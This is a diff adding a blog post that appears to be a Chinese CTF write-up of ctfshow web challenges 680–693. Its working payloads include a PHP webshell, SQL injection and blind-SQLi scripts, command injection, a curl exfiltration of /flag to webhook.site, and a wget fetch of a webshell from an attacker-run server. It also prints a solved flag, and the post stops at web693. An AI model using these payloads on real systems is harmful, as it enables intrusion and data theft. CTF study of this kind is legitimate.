@@ -1,0 +1,1279 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[ctfshow]大赛原题 - 1 | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1783248062137">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="web680
+
+PHP代码执行
+disable_functions绕过
+
+先使用phpinfo()，发现有一堆disable_functions
+assert,system,passthru,exec,pcntl_exec,shell_ex..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1783248062137" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[ctfshow]大赛原题 - 1</h2>
+            <div class="post-date">2024-08-22</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/ctfshowda-sai-yuan-ti.jpg')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="web680">web680</h2>
+<blockquote>
+<p>PHP代码执行<br>
+disable_functions绕过</p>
+</blockquote>
+<p>先使用<code>phpinfo()</code>，发现有一堆<code>disable_functions</code></p>
+<pre><code>assert,system,passthru,exec,pcntl_exec,shell_exec,popen,proc_open,pcntl_alarm,pcntl_fork,pcntl_waitpid,pcntl_wait,pcntl_wifexited,pcntl_wifstoped,pcntl_wifsignaled,pcntl_wexitstatus,pcntl_wtermsig,pcntl_wstopsig,pcntl_signal,pcntl_signal_dispatch,pcntl_get_last_error,pcntl_strerror,fopen,file_get_contents,fread,file,readfile,opendir,readdir,closedir,rewinddir
+</code></pre>
+<p>在蚁剑中查看目录需要用到<code>opendir</code>,<code>readdir</code>,<code>closedir</code>。</p>
+<p>这里还有一个<a href="https://www.php.net/manual/zh/function.scandir.php">scandir</a>函数是可以列出指定路径中的文件和目录</p>
+<pre><code>code=var_dump(scandir(&quot;.&quot;));
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://fallingskies22.github.io/post-images/1724294340073.png" alt="" loading="lazy"></figure>
+<p>读取文件使用<a href="https://www.php.net/manual/zh/function.highlight-file.php">highlight_file</a></p>
+<pre><code>code=highlight_file(secret_you_never_know);
+</code></pre>
+<h2 id="web681">web681</h2>
+<blockquote>
+<p>SQL注入</p>
+</blockquote>
+<p>根据回显提示</p>
+<pre><code>select count(*) from ctfshow_users where username = '$name' or nickname = '$name'
+</code></pre>
+<p><code>'</code>被过滤了，使用<code>\</code>转义<code>'</code>来注入。</p>
+<p>payload</p>
+<pre><code>name=||1=1#\
+</code></pre>
+<h2 id="web682">web682</h2>
+<blockquote>
+<p>JS混淆加密<br>
+反调试</p>
+</blockquote>
+<p>这里采用的是<a href="https://github.com/javascript-obfuscator/javascript-obfuscator">JavaScript obfuscator</a></p>
+<p>使用反混淆的<a href="https://obf-io.deobfuscate.io/">在线网站</a></p>
+<pre><code class="language-js">eval(function (_0x511e23, _0xa7df9a, _0x1ec6e8, _0x334e7c, _0x20ea53, _0x455db4) {
+  _0x20ea53 = function (_0x241f82) {
+    return _0x241f82.toString(_0xa7df9a);
+  };
+  if (!''.replace(/^/, String)) {
+    while (_0x1ec6e8--) {
+      _0x455db4[_0x20ea53(_0x1ec6e8)] = _0x334e7c[_0x1ec6e8] || _0x20ea53(_0x1ec6e8);
+    }
+    _0x334e7c = [function (_0x2a38d4) {
+      return _0x455db4[_0x2a38d4];
+    }];
+    _0x20ea53 = function () {
+      return &quot;\\w+&quot;;
+    };
+    _0x1ec6e8 = 0x1;
+  }
+  ;
+  while (_0x1ec6e8--) {
+    if (_0x334e7c[_0x1ec6e8]) {
+      _0x511e23 = _0x511e23.replace(new RegExp(&quot;\\b&quot; + _0x20ea53(_0x1ec6e8) + &quot;\\b&quot;, 'g'), _0x334e7c[_0x1ec6e8]);
+    }
+  }
+  return _0x511e23;
+}(&quot;(3(){(3 a(){7{(3 b(2){9((''+(2/2)).5!==1||2%g===0){(3(){}).8('4')()}c{4}b(++2)})(0)}d(e){f(a,6)}})()})();&quot;, 0x11, 0x11, '||i|function|debugger|length|5000|try|constructor|if|||else|catch||setTimeout|20'.split('|'), 0x0, {}));
+
+//将16进制数转为数字,长度只能为1，不然返回0
+var c2n = _0x1d65f5 =&gt; {
+  if (_0x1d65f5.length &gt; 0x1) {
+    return 0x0;
+  }
+  if (_0x1d65f5.charCodeAt() &gt; 0x60 &amp;&amp; _0x1d65f5.charCodeAt() &lt; 0x67) {
+    return _0x1d65f5.charCodeAt() - 0x57;
+  }
+  if (parseInt(_0x1d65f5) &gt; 0x0) {
+    return parseInt(_0x1d65f5);
+  }
+  return 0x0;
+};
+
+//将每位数加到一起
+var s2n2su = _0x511796 =&gt; {
+  r = 0x0;
+  for (var _0x28ce10 = _0x511796.length - 0x1; _0x28ce10 &gt;= 0x0; _0x28ce10--) {
+    r += c2n(_0x511796[_0x28ce10]);
+  }
+  return r;
+};
+
+function test() {
+  var _0x4bf698 = document.getElementById(&quot;message&quot;).value;
+  if (sha256(_0x4bf698) !== 'e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d') {  //sha256校验
+    return alert('error');
+  }
+  var _0x15409a = _0x4bf698.substring(0x0, 0x8);
+  if (_0x15409a !== &quot;ctfshow{&quot;) {   //开头为ctfshow{
+    return alert('error');
+  }
+  }
+  if (_0x4bf698.substring(_0x4bf698.length, _0x4bf698.length - 0x1) !== '}') { //结尾为}
+    return alert('error');
+  }
+  var _0xa109f6 = _0x4bf698.substring(0x8, _0x4bf698.length - 0x1); //中间值长度为0x24
+  if (_0xa109f6.length !== 0x24) {
+    return alert('error');
+  }
+  var _0x3f5e35 = _0xa109f6.split('-');  //使用-将中间值分割为5段
+  if (_0x3f5e35.length !== 0x5) {
+    return alert('error');
+  }
+  if (s2n2su(_0x3f5e35[0x0]) !== 0x3f) {  //第一段
+    return alert('error');
+  }
+  if (sha256(_0x3f5e35[0x0].substr(0x0, 0x4)) !== &quot;c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400&quot;) {  //第一段的前四位sha256值，解出来为592b
+    return alert('error');
+  }
+  if (sha256(_0x3f5e35[0x0].substr(0x4, 0x8)) !== 'f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc') {  //第一段的后四位sha256值，解出来为9d77
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x1][0x0]) !== c2n('a') - 0x1) { //第二段的第1位为9
+    return alert('error');
+  }
+  if (_0x3f5e35[0x1][0x1] + _0x3f5e35[0x1][0x2] + _0x3f5e35[0x1][0x3] !== &quot;dda&quot;) {  //第三段134位为430  左边是10进制右边是16进制
+    return alert('error');
+  }
+  if (_0x3f5e35[0x2][0x1] !== 'e') {  //第三段的第2位为e
+    return alert('error');
+  }
+  if (_0x3f5e35[0x2][0x0] + _0x3f5e35[0x2][0x2] + _0x3f5e35[0x2][0x3] != 0x1ae) {  //第三段134位为1ae
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x0]) !== c2n('a') - 0x1) {  //第四段的第1位为9
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x1]) !== parseInt(_0x3f5e35[0x3][0x3])) {  //第四段的第2位和第4位相等
+    return alert('error');
+  }
+  if (parseInt(_0x3f5e35[0x3][0x3]) * 0x2 + c2n('a') !== 0x12) {  //第四段的第4位为4
+    return alert('error');
+  }
+  if (sha224(_0x3f5e35[0x3][0x2]) !== &quot;abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5&quot;) {  //第四段第三位sha224值，解出来为a
+    return alert('error');
+  }
+  if (st3(_0x3f5e35[0x4]) !== &quot;GVSTMNDGGQ2DSOLBGUZA====&quot;) {  //第五段为5e64f4499a52
+    return alert('error');
+  }
+  alert(&quot;you are right&quot;);
+}
+const Base64 = {
+  '_keyStr': &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=&quot;,
+  'encode': function (_0x1b46bf) {
+    var _0x1630dc = '';
+    var _0x393cc5;
+    var _0x201a2c;
+    var _0x42e93f;
+    var _0x13c018;
+    var _0x4de829;
+    var _0x165e47;
+    var _0x38f23e;
+    var _0x67b74e = 0x0;
+    _0x1b46bf = Base64._utf8_encode(_0x1b46bf);
+    while (_0x67b74e &lt; _0x1b46bf.length) {
+      _0x393cc5 = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x201a2c = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x42e93f = _0x1b46bf.charCodeAt(_0x67b74e++);
+      _0x13c018 = _0x393cc5 &gt;&gt; 0x2;
+      _0x4de829 = (_0x393cc5 &amp; 0x3) &lt;&lt; 0x4 | _0x201a2c &gt;&gt; 0x4;
+      _0x165e47 = (_0x201a2c &amp; 0xf) &lt;&lt; 0x2 | _0x42e93f &gt;&gt; 0x6;
+      _0x38f23e = _0x42e93f &amp; 0x3f;
+      if (isNaN(_0x201a2c)) {
+        _0x165e47 = _0x38f23e = 0x40;
+      } else if (isNaN(_0x42e93f)) {
+        _0x38f23e = 0x40;
+      }
+      _0x1630dc = _0x1630dc + this._keyStr.charAt(_0x13c018) + this._keyStr.charAt(_0x4de829) + this._keyStr.charAt(_0x165e47) + this._keyStr.charAt(_0x38f23e);
+    }
+    return _0x1630dc;
+  },
+  'decode': function (_0x38afb7) {
+    var _0x4e6b84 = '';
+    var _0x2b6149;
+    var _0x3edd27;
+    var _0x5f1062;
+    var _0x665708;
+    var _0x2fc104;
+    var _0x4ec53d;
+    var _0x9d69a0;
+    var _0x403f00 = 0x0;
+    _0x38afb7 = _0x38afb7.replace(/[^A-Za-z0-9+/=]/g, '');
+    while (_0x403f00 &lt; _0x38afb7.length) {
+      _0x665708 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x2fc104 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x4ec53d = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x9d69a0 = this._keyStr.indexOf(_0x38afb7.charAt(_0x403f00++));
+      _0x2b6149 = _0x665708 &lt;&lt; 0x2 | _0x2fc104 &gt;&gt; 0x4;
+      _0x3edd27 = (_0x2fc104 &amp; 0xf) &lt;&lt; 0x4 | _0x4ec53d &gt;&gt; 0x2;
+      _0x5f1062 = (_0x4ec53d &amp; 0x3) &lt;&lt; 0x6 | _0x9d69a0;
+      _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x2b6149);
+      if (_0x4ec53d != 0x40) {
+        _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x3edd27);
+      }
+      if (_0x9d69a0 != 0x40) {
+        _0x4e6b84 = _0x4e6b84 + String.fromCharCode(_0x5f1062);
+      }
+    }
+    _0x4e6b84 = Base64._utf8_decode(_0x4e6b84);
+    return _0x4e6b84;
+  },
+  '_utf8_encode': function (_0x477ba6) {
+    _0x477ba6 = _0x477ba6.replace(/rn/g, 'n');
+    var _0xc59cb = '';
+    for (var _0x284f9e = 0x0; _0x284f9e &lt; _0x477ba6.length; _0x284f9e++) {
+      var _0x234f6f = _0x477ba6.charCodeAt(_0x284f9e);
+      if (_0x234f6f &lt; 0x80) {
+        _0xc59cb += String.fromCharCode(_0x234f6f);
+      } else if (_0x234f6f &gt; 0x7f &amp;&amp; _0x234f6f &lt; 0x800) {
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0x6 | 0xc0);
+        _0xc59cb += String.fromCharCode(_0x234f6f &amp; 0x3f | 0x80);
+      } else {
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0xc | 0xe0);
+        _0xc59cb += String.fromCharCode(_0x234f6f &gt;&gt; 0x6 &amp; 0x3f | 0x80);
+        _0xc59cb += String.fromCharCode(_0x234f6f &amp; 0x3f | 0x80);
+      }
+    }
+    return _0xc59cb;
+  },
+  '_utf8_decode': function (_0x1da40d) {
+    var _0x21181b = '';
+    var _0x24d5d3 = 0x0;
+    var _0x117591 = c1 = c2 = 0x0;
+    while (_0x24d5d3 &lt; _0x1da40d.length) {
+      _0x117591 = _0x1da40d.charCodeAt(_0x24d5d3);
+      if (_0x117591 &lt; 0x80) {
+        _0x21181b += String.fromCharCode(_0x117591);
+        _0x24d5d3++;
+      } else if (_0x117591 &gt; 0xbf &amp;&amp; _0x117591 &lt; 0xe0) {
+        c2 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x1);
+        _0x21181b += String.fromCharCode((_0x117591 &amp; 0x1f) &lt;&lt; 0x6 | c2 &amp; 0x3f);
+        _0x24d5d3 += 0x2;
+      } else {
+        c2 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x1);
+        c3 = _0x1da40d.charCodeAt(_0x24d5d3 + 0x2);
+        _0x21181b += String.fromCharCode((_0x117591 &amp; 0xf) &lt;&lt; 0xc | (c2 &amp; 0x3f) &lt;&lt; 0x6 | c3 &amp; 0x3f);
+        _0x24d5d3 += 0x3;
+      }
+    }
+    return _0x21181b;
+  }
+};
+
+//base32
+function st3(_0x7b38bf) {
+  if (!_0x7b38bf) {
+    return '';
+  }
+  let _0x23522e = 0x0;
+  let _0x23a42a = 0x0;
+  let _0x585f75;
+  let _0x102dee;
+  let _0x5ecc5a = '';
+  _0x7b38bf = Base64._utf8_encode(_0x7b38bf);
+  for (let _0x6e2692 = 0x0; _0x6e2692 &lt; _0x7b38bf.length;) {
+    _0x585f75 = _0x7b38bf.charCodeAt(_0x6e2692) &gt;= 0x0 ? _0x7b38bf.charCodeAt(_0x6e2692) : _0x7b38bf.charCodeAt(_0x6e2692) + 0x100;
+    if (_0x23522e &gt; 0x3) {
+      if (_0x6e2692 + 0x1 &lt; _0x7b38bf.length) {
+        _0x102dee = _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) &gt;= 0x0 ? _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) : _0x7b38bf.charCodeAt(_0x6e2692 + 0x1) + 0x100;
+      } else {
+        _0x102dee = 0x0;
+      }
+      _0x23a42a = _0x585f75 &amp; 0xff &gt;&gt; _0x23522e;
+      _0x23522e = (_0x23522e + 0x5) % 0x8;
+      _0x23a42a &lt;&lt;= _0x23522e;
+      _0x23a42a |= _0x102dee &gt;&gt; 0x8 - _0x23522e;
+      _0x6e2692++;
+    } else {
+      _0x23a42a = _0x585f75 &gt;&gt; 0x8 - (_0x23522e + 0x5) &amp; 0x1f;
+      _0x23522e = (_0x23522e + 0x5) % 0x8;
+      if (_0x23522e == 0x0) {
+        _0x6e2692++;
+      }
+    }
+    _0x5ecc5a = _0x5ecc5a + &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ234567&quot;.charAt(_0x23a42a);
+  }
+  while (_0x5ecc5a.length % 0x8 !== 0x0) {
+    _0x5ecc5a += '=';
+  }
+  return _0x5ecc5a;
+}
+</code></pre>
+<p>最前面的eval是用来反调试的，当打开网页调试工具时会循环进行debug<br>
+主要看test函数对输入值的校验。</p>
+<p>得到最终的值</p>
+<pre><code>ctfshow{592b9d77-9dda-4e30-94a4-5e64f4499a52}
+</code></pre>
+<h2 id="web683">web683</h2>
+<p>连着几道都是<a href="https://xz.aliyun.com/t/6333">code-breaking</a>的题目</p>
+<blockquote>
+<p>PHP intval()函数绕过<br>
+科学计数法</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+
+   error_reporting(0);
+   include &quot;flag.php&quot;;
+   if(isset($_GET['秀'])){
+       if(!is_numeric($_GET['秀'])){
+          die('必须是数字');
+       }else if($_GET['秀'] &lt; 60 * 60 * 24 * 30 * 2){
+          die('你太短了');
+       }else if($_GET['秀'] &gt; 60 * 60 * 24 * 30 * 3){
+           die('你太长了');
+       }else{
+           sleep((int)$_GET['秀']);
+           echo $flag;
+       }
+       echo '&lt;hr&gt;';
+   }
+   highlight_file(__FILE__);
+</code></pre>
+<p>利用对科学计数法数字解析不一致来绕过<br>
+但只在php版本小于等于7.0.9时存在,这里服务端是5.6.40<br>
+payload</p>
+<pre><code>?秀=0.6e7
+</code></pre>
+<h2 id="web684">web684</h2>
+<blockquote>
+<p>PHP命名空间<br>
+create_function函数注入</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+$action = $_GET['action'] ?? '';
+$arg = $_GET['arg'] ?? '';
+
+if(preg_match('/^[a-z0-9_]*$/isD', $action)) {
+    show_source(__FILE__);
+} else {
+    $action('', $arg);
+}
+</code></pre>
+<p>首先利用命名空间绕过函数名的校验，php 里默认命名空间是<code> \</code>，所有原生函数和类都在这个命名空间中。</p>
+<p>再利用<a href="https://www.php.net/manual/en/function.create-function.php">create_funcion</a>,这个函数的第二个参数处存在代码注入。🤣</p>
+<pre><code>create_function('', return 1);
+</code></pre>
+<p>效果等同于下面代码</p>
+<pre><code>eval(
+function __lambda_func(){
+  return 1;
+}
+)
+</code></pre>
+<p>我们可以闭合functon，加入想执行的代码。</p>
+<p>payload</p>
+<pre><code>?action=\create_function&amp;arg=return%201;}system(%27cat%20/secret_you_never_know%27);/*
+</code></pre>
+<h2 id="web685">web685</h2>
+<blockquote>
+<p>PHP文件上传<br>
+PCRE 回溯次数限制绕过正则</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+function is_php($data){
+    return preg_match('/&lt;\?.*[(`;?&gt;].*/is', $data);
+}
+
+if(empty($_FILES)) {
+    die(show_source(__FILE__));
+}
+
+$user_dir = './data/';
+$data = file_get_contents($_FILES['file']['tmp_name']);
+if (is_php($data)) {
+    echo &quot;bad request&quot;;
+} else {
+    @mkdir($user_dir, 0755);
+    $path = $user_dir . '/' . random_int(0, 10) . '.php';
+    move_uploaded_file($_FILES['file']['tmp_name'], $path);
+
+    header(&quot;Location: $path&quot;, true, 303);
+}
+</code></pre>
+<p>可以使用<a href="https://regex101.com/">Regex Debugger</a>看正则匹配过程</p>
+<p>php 有一个回溯上限 backtrack_limit ，默认是 1000000。如果回溯上限超过 100 万那么 preg_match 返回 false,正常是返回0和1。</p>
+<p>再shell后面加100万个a</p>
+<p>payload</p>
+<pre><code>&lt;?php eval($_POST[1]);?&gt;//aaaaaa...
+</code></pre>
+<h2 id="web686">web686</h2>
+<blockquote>
+<p>PHP无参 RCE</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+if(';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['code'])) {    
+    eval($_GET['code']);
+} else {
+    show_source(__FILE__);
+}
+</code></pre>
+<p>正则要求只能为无参函数，可以嵌套。<br>
+可以查看phpinfo页面。</p>
+<pre><code>phpinfo();
+</code></pre>
+<p>payload</p>
+<pre><code>?code=eval(end(current(get_defined_vars())));&amp;a=system('cat%20/secret_you_never_know');
+</code></pre>
+<h2 id="web687">web687</h2>
+<blockquote>
+<p>命令注入绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    highlight_file(__FILE__);
+    $target = $_REQUEST[ 'ip' ];
+    $target=trim($target);
+    $substitutions = array(
+        '&amp;'  =&gt; '',
+        ';' =&gt; '',
+        '|' =&gt; '',
+        '-'  =&gt; '',
+        '$'  =&gt; '',
+        '('  =&gt; '',
+        ')'  =&gt; '',
+        '`'  =&gt; '',
+        '||' =&gt; '',
+    );
+
+    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
+    $cmd = shell_exec( 'ping  -c 1 ' . $target );
+    echo  &quot;&lt;pre&gt;{$cmd}&lt;/pre&gt;&quot;;
+</code></pre>
+<p>查看<a href="https://www.php.net/manual/en/function.trim.php">trim</a>函数发现只会去除头和尾的空白符。我们可以使用<code>%0a</code>的方式来执行命令。</p>
+<p>payload</p>
+<pre><code>?ip=127.0.0.1%0acat%20/flaaag
+</code></pre>
+<h2 id="web688">web688</h2>
+<blockquote>
+<p>命令注入绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+highlight_file(__FILE__);
+error_reporting(0);
+
+//flag in /flag
+$url = $_GET['url'];
+$urlInfo = parse_url($url);
+if(!(&quot;http&quot; === strtolower($urlInfo[&quot;scheme&quot;]) || &quot;https&quot;===strtolower($urlInfo[&quot;scheme&quot;]))){
+    die( &quot;scheme error!&quot;);
+ }
+$url=escapeshellarg($url);
+$url=escapeshellcmd($url);
+system(&quot;curl &quot;.$url);
+</code></pre>
+<p>在<a href="https://www.php.net/manual/zh/function.escapeshellarg.php"><code>escapeshellarg</code></a>和<a href="https://www.php.net/manual/zh/function.escapeshellcmd.php"><code>escapeshellcmd</code></a>同时使用的情况下会造成命令注入绕过。</p>
+<p>escapeshellarg函数会对所有单引号进行转义，并在字符串两边加上单引号。<br>
+escapeshellcmd会对特殊字符进行转义。<br>
+当同时使用时，escapeshellcmd会将escapeshellarg函数转义时使用的<code>\</code>进行转义，这样就导致单引号就逃逸了。</p>
+<p>使用curl自带的-F参数，使用上传文件方式带出数据</p>
+<p>需要记得闭合后面的单引号<br>
+payload</p>
+<pre><code>?url=https://webhook.site/71e198ec-e444-449d-a394-a46673608347/%27%20-F%20file=@/flag%20%27
+</code></pre>
+<h2 id="web689">web689</h2>
+<blockquote>
+<p>SSRF</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php 
+error_reporting(0);
+if(isset($_GET) &amp;&amp; !empty($_GET)){
+    $url = $_GET['file'];
+    $path = &quot;upload/&quot;.$_GET['path'];
+    
+}else{
+    show_source(__FILE__);
+    exit();
+}
+
+if(strpos($path,'..') &gt; -1){
+    die('This is a waf!');
+}
+if(strpos($url,'http://127.0.0.1/') === 0){
+    file_put_contents($path, file_get_contents($url));
+    echo &quot;console.log($path update successed!)&quot;;
+}else{
+    echo &quot;Hello.CTFshow&quot;;
+}
+</code></pre>
+<p>可以写入文件，但内容限制只能为<code>http://127.0.0.1/</code>开头的返回值<br>
+发现页面会回显<code>$path</code>值，可以用来控制写入文件内容。</p>
+<p>payload</p>
+<pre><code>?path=1.php&amp;file=http://127.0.0.1/?file=http://127.0.0.1/%26path=&lt;?php%20system(%27cat%20/flag%27);?&gt;
+</code></pre>
+<h2 id="web690">web690</h2>
+<blockquote>
+<p>命令执行绕过</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php 
+highlight_file(__FILE__);
+error_reporting(0);
+$args = $_GET['args'];
+for ( $i=0; $i&lt;count($args); $i++ ){
+    if ( !preg_match('/^\w+$/', $args[$i]) )
+        exit(&quot;sorry&quot;);
+}
+
+exec('./ ' . implode(&quot; &quot;, $args));
+</code></pre>
+<p>使用<code>%0a</code>不仅能通过正则校验，还能实现命令注入。<br>
+命令参数限制只能为[a-zA-Z0-9_]</p>
+<p><a href="https://www.metools.info/other/ipconvert162.html">将ip转为10进制</a></p>
+<pre><code>?args[0]=a%0a&amp;args[1]=wget&amp;args[2]=ip
+</code></pre>
+<p>wget下载时当没有文件名时使用默认文件名<code>index.html</code></p>
+<p>自己写一个py脚本来响应请求</p>
+<pre><code class="language-python">from http.server import HTTPServer, BaseHTTPRequestHandler
+ 
+host = ('0.0.0.0', 80)
+ 
+class Resquest(BaseHTTPRequestHandler):
+    def do_GET(self):
+        self.send_response(200)
+        self.end_headers()
+        self.wfile.write(b&quot;&lt;?php file_put_contents(\&quot;shell.php\&quot;,'&lt;?php eval($_POST[1]);?&gt;');?&gt;&quot;)
+ 
+if __name__ == '__main__':
+    server = HTTPServer(host, Resquest)
+    print(&quot;Starting server, listen at: %s:%s&quot; % host)
+    server.serve_forever()
+</code></pre>
+<p>创建了一个a目录，并把index.html下载进去了</p>
+<pre><code>args[0]=1%0a&amp;args[1]=mkdir&amp;args[2]=a%0a&amp;args[3]=cd&amp;args[4]=a%0a&amp;args[5]=wget&amp;args[6]=ip
+</code></pre>
+<p>因为<code>index.html</code>文件名含有<code>.</code>，这里无法使用php来执行。<br>
+我们创建的目录就有用了</p>
+<p>将目录a压缩至文件<code>shell</code>，这样文件名就不含<code>.</code>了，同时还保留着文件内容在里面。</p>
+<pre><code>?args[0]=1%0a&amp;args[1]=tar&amp;args[2]=cvf&amp;args[3]=shell&amp;args[4]=a
+</code></pre>
+<p>使用php执行文件</p>
+<pre><code>?args[0]=1%0a&amp;args[1]=php&amp;args[2]=shell
+</code></pre>
+<p>连接生成的shell.php</p>
+<h2 id="web691">web691</h2>
+<blockquote>
+<p>SQL注入<br>
+order by 排序盲注技巧</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+ 
+include('inc.php');
+highlight_file(__FILE__);
+error_reporting(0);
+function   filter($str){
+      $filterlist = &quot;/\(|\)|username|password|where|
+      case|when|like|regexp|into|limit|=|for|;/&quot;;
+      if(preg_match($filterlist,strtolower($str))){
+        die(&quot;illegal input!&quot;);
+      }
+      return $str;
+  }
+$username = isset($_POST['username'])?
+filter($_POST['username']):die(&quot;please input username!&quot;);
+$password = isset($_POST['password'])?
+filter($_POST['password']):die(&quot;please input password!&quot;);
+$sql = &quot;select * from admin where  username =
+ '$username' and password = '$password' &quot;;
+
+$res = $conn -&gt; query($sql);
+if($res-&gt;num_rows&gt;0){
+  $row = $res -&gt; fetch_assoc();
+  if($row['id']){
+     echo $row['username'];
+  }
+}else{
+   echo &quot;The content in the password column is the flag!&quot;;
+}
+
+?&gt;
+</code></pre>
+<p>只会回显username，再加上一堆过滤，想通过UNION回显注入不行。<br>
+这里用到order by的一种特殊排序盲注的方式。</p>
+<p>order by比较字符串时，会转换成hex从首字母开始比较，这里当我们设置字符串小于等于password时，会显示2，当大于password时，显示admin.</p>
+<p>poc</p>
+<pre><code class="language-python">import requests
+
+s=&quot;-0123456789abcdefghijklmnopqrstuvwxyz{}&quot;
+url=&quot;http://735a5330-22d4-44e4-88aa-77832c4633ba.challenge.ctf.show/&quot;
+
+flag=''
+for i in range(1,46):
+	print(i)
+	for j in s:
+		data={
+		'username':&quot;'||TRUE union select 1,2,'{0}' order by 3#&quot;.format(flag+j),
+		'password':''
+	    }
+		r=requests.post(url,data=data)
+		print(data['username'])
+		if(&quot;&lt;/code&gt;admin&quot; in r.text):
+			flag=flag+s[s.index(j)-1]
+			print(flag)
+			break
+</code></pre>
+<h2 id="web692">web692</h2>
+<blockquote>
+<p>addslashes+preg_replace函数单引号逃逸</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+
+highlight_file(__FILE__);
+
+if(!isset($_GET['option'])) die();
+$str = addslashes($_GET['option']);
+$file = file_get_contents('./config.php');
+$file = preg_replace('|\$option=\'.*\';|', &quot;\$option='$str';&quot;, $file);
+file_put_contents('./config.php', $file);
+</code></pre>
+<p>参考<a href="https://www.php.net/manual/zh/function.preg-replace.php">preg_replace使用文档</a></p>
+<p>preg_replace函数想要替换值为<code>\</code>,$replacement需要为<code>\\</code>，<br>
+当$replacement=<code>\\\</code>时，会替换为<code>\\</code>。</p>
+<p>这里因为使用了addslashes，我们传入参数<code>\'</code>，经过函数后会变为<code>\\\'</code><br>
+再根据上面preg_replace的特性，结果会替换为<code>\\'</code>，这样就会导致单引号逃逸，我们可以在config.php中注入php代码。</p>
+<p>payload</p>
+<pre><code>?option=\';system($_GET[1]);/*
+</code></pre>
+<h2 id="web693">web693</h2>
+<blockquote>
+<p>extract覆盖变量</p>
+</blockquote>
+<pre><code class="language-php">&lt;?php
+    highlight_file(__FILE__);
+    error_reporting(0);
+    ini_set('open_basedir', '/var/www/html');
+    $file = 'function.php';
+    $func = isset($_GET['function'])?$_GET['function']:'filters'; 
+    call_user_func($func,$_GET);
+    include($file);
+    session_start();
+    $_SESSION['name'] = $_POST['name'];
+    if($_SESSION['name']=='admin'){
+        header('location:admin.php');
+    }
+?&gt;
+</code></pre>
+<p><code>call_user_func</code>函数的第二个参数是<code>$_GET</code>，需要找一个参数是数组的函数来利用，刚好<code>extract</code>函数就能实现，覆盖<code>$file</code>参数来利用文件包含执行php。</p>
+<p>payload</p>
